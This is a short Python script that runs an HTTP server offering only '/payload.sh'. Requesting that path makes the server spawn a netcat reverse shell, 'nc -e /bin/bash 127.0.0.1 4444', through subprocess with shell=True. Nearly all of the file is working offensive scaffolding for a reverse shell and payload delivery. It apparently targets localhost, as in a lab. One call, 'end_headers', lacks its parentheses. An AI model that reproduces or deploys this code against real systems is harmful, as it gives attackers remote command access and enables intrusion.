from http.server import SimpleHTTPRequestHandler, HTTPServer
import subprocess

class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        allowed_files=['/payload.sh']

        if self.path in allowed_files:
            if self.path == '/payload.sh':
                self.execute_reverse_shell()
            super().do_GET()
        else:
            self.send_response(403)
            self.end_headers
            self.wfile.write(b'Access Denied')
        
    def execute_reverse_shell(self):
        print("[*] Triggering reverse shell...")

        reverse_shell_command = "nc -e /bin/bash 127.0.0.1 4444"

        subprocess.Popen(reverse_shell_command, shell=True)
    

def run(server_class=HTTPServer, handler_class =CustomHTTPRequestHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()


if __name__ == '__main__':
    run()